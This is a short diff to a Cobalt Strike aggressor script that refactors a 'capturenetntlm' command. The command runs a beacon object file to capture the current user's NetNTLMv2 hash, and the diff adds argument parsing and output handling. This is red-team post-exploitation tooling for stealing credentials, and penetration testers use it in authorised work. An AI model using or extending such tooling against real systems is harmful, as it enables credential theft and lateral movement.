@@ -11,13 +11,24 @@ beacon_command_register(
 	
 alias capturenetntlm
 {
-    $bid = $1;
+    local('$bid %cmd $arg_data $bof_path $output_name');
 
-    # Read in the right BOF file
-    $handle = openf(script_resource("capturenetntlm.o"));
-    $data = readb($handle, -1);
-    closef($handle);
+    ($bid) = @_;
+
+    $bof_path    = "capturenetntlm.o";
+	$output_name = "capture_net_ntlm";
+
+    %cmd = parse_command(@_);
+
+    if (%cmd is $null)
+    {
+        berror($bid, "Error parsing command\n");
+        return;
+    }
+
+    %cmd["file"] = generate_file_name($bid, %cmd["file"], $output_name);
 
 	blog($bid, "Tasked to capture the current user's NetNTLMv2 hash..");
-    beacon_inline_execute($bid, $data, "go", $null);
+
+    handle_output_beacon_inline_execute($bid, $bof_path, "go", %cmd, $null);
 }
